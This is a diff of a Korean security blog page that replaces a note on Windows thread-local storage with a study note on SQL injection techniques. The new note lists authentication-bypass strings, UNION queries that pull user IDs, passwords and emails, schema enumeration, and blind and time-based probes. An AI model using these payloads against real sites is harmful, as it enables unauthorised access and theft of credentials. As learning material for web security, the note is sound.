@@ -12,7 +12,7 @@
 
 
 
-<title>TLS | Sn0wD3er</title>
+<title>SQL Injection 기법 | Sn0wD3er</title>
 
 
 
@@ -173,7 +173,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">TLS</h1>
+            <h1 class="post-title">SQL Injection 기법</h1>
             
                 <div class="post-meta">
                     
@@ -182,14 +182,14 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">November 14, 2020&nbsp;&nbsp;22:30:18</a>
+                        Date: <a href="#">November 15, 2020&nbsp;&nbsp;19:49:08</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="/categories/Windows/">Windows</a>
+                                <a href="/categories/Web/">Web</a>
                             
                         </span>
                     
@@ -198,14 +198,57 @@
         </header>
 
         <div class="post-content">
-            <h2 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h2><p>스레드마다 다른 값을 가지는 전역변수, 즉 스레드가 고유한 저장공간을 갖는다 생각하면 된다. 레이스 컨디션과 메모리 누수를 해결하기위해 도입</p>
-<h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><ul>
-<li>TlsAlloc(), TlsFree : 동적할당</li>
-<li>__declspec(Thread) int g_value = 0 : 정적할당</li>
-<li>.tls Section에 생성</li>
+            <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="인증-우회"><a href="#인증-우회" class="headerlink" title="인증 우회"></a>인증 우회</h3><ul>
+<li><p>인증 쿼리 질의문<br><code>Select * from members where id=&#39;&#39; and pass=&#39;&#39;</code></p>
+</li>
+<li><p><code>&#39; or 1=1 #</code></p>
+</li>
+<li><p><code>&#39; or &#39;x&#39;=&#39;x</code></p>
+</li>
+<li><p><code>&quot; or &quot;x&quot;=&quot;x</code></p>
+</li>
+<li><p><code>&#39;) or (&#39;x&#39;=&#39;x</code></p>
+</li>
+<li><p><code>&quot;) or (&quot;x&quot;=&quot;x</code></p>
+</li>
 </ul>
-<h3 id="TLS-Callback-Function"><a href="#TLS-Callback-Function" class="headerlink" title="TLS Callback Function"></a>TLS Callback Function</h3><p>프로세스 스레드가 생성/종료될 떄마다 자동으로 호출되는 함수이며 프로세스 진입점 이전에 실행되는 루틴이다. 특히 악성코드에서 안티 디버깅에 주로 쓰인다.<br>PE의 TLS Directory 구조체에 AddressofCallBacks를 통해 주소 확인이 가능하다.</p>
-<p>~</p>
+<h3 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h3><ul>
+<li><code>0&#39; union select all 1,concat(id,login,password),3,4,concat(email,secret),6,7 from users#</code></li>
+<li><code>0&#39; union select all 1,2,3,4,5 #</code> </li>
+<li><code>&#39; union select all 1,2,3,4,5,6,7,8,9,10,11#</code></li>
+<li><code>&#39; union select all 1,2,database(),4,5,6,7#</code></li>
+<li><code>&#39; union select all 1,2,table_name,4,5,6,7,8 from information_schema.tables#</code></li>
+<li><code>&#39; union select all 1,2,column_name,4,5,6 from information_schema.columns where table_name=&#39;users&#39;#</code></li>
+<li><code>&#39; order by 10#</code> : 컬럼 개수 알아내기 컬럼 개수가 크면 에러가 나온다</li>
+</ul>
+<p>UNION SELECT ALL 다음 컬럼 값은 앞선 질의문의 쿼리문의 개수와 같아야한다. </p>
+<h3 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h3><ul>
+<li><code>&#39; or 1=1 and length(database())=5#</code></li>
+<li><code>&#39; or 1=1= and substring(database(),1,1)=&#39;b&#39;#</code></li>
+<li><code>&#39; or 1=1 and ascii(substring(database(),1,1))=98#</code></li>
+</ul>
+<p>‘참’과 ‘거짓’의 결과만으로 결과를 얻어낸다.</p>
+<h3 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time Based"></a>Time Based</h3><ul>
+<li><code>&#39; or 1=1 and sleep(5)#</code></li>
+</ul>
+<p>sleep()함수를 이용해서 시간을 비교해서 원하는 결과를 얻는 방법, 하지만 시간도 많이 걸리고 제일 마지막에 시도하는 방법이다.</p>
+<h2 id="SQL-Injection-Cheat-Sheet"><a href="#SQL-Injection-Cheat-Sheet" class="headerlink" title="SQL Injection Cheat Sheet"></a>SQL Injection Cheat Sheet</h2><p><a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p>
+<h2 id="My-SQL-Injection에-기본적으로-알아야-할-것들"><a href="#My-SQL-Injection에-기본적으로-알아야-할-것들" class="headerlink" title="My SQL Injection에 기본적으로 알아야 할 것들"></a>My SQL Injection에 기본적으로 알아야 할 것들</h2><ul>
+<li>@@version</li>
+<li>information_schema.tables<ul>
+<li>table_name</li>
+</ul>
+</li>
+<li>information_shcema.columns<ul>
+<li>column_name</li>
+</ul>
+</li>
+<li>database()</li>
+<li>length()</li>
+<li>substring(문자열,시작,개수)</li>
+<li>ascii()</li>
+<li>limit 시작,개수 : 컬럼을 하나씩 가져오기위해 사용</li>
+</ul>
 
         </div>
 
@@ -220,7 +263,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://sn0wd3er.github.io/2020/11/14/reversing/windows/windowStructure/2020-11-12-tls/">https://sn0wd3er.github.io/2020/11/14/reversing/windows/windowStructure/2020-11-12-tls/</a></span>
+                        <span><a href="https://sn0wd3er.github.io/2020/11/15/web/sqlInjection/2020-11-15-sqlInjection/">https://sn0wd3er.github.io/2020/11/15/web/sqlInjection/2020-11-15-sqlInjection/</a></span>
                     </p>
                 
                 
@@ -244,7 +287,7 @@
                 <span class="tag">
                     
                     
-                        <a href="/tags/TLS/"># TLS</a>
+                        <a href="/tags/SQL-Injection/"># SQL Injection</a>
                     
                         
                 </span>
@@ -257,10 +300,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2020/11/14/tools/privesc/2020-11-14-privesc/">Privesc Site</a>
+                <a class="prev" rel="prev" href="/2020/11/16/network/basic/2020-11-16-osi/">OSI 7 Layer</a>
             
             
-            <a class="next" rel="next" href="/2020/11/14/reversing/windows/windowStructure/2020-11-12-teb/">TEB</a>
+            <a class="next" rel="next" href="/2020/11/15/reversing/windows/windowStructure/2020-11-15-pe/">PE 파일</a>
             
         </section>
 
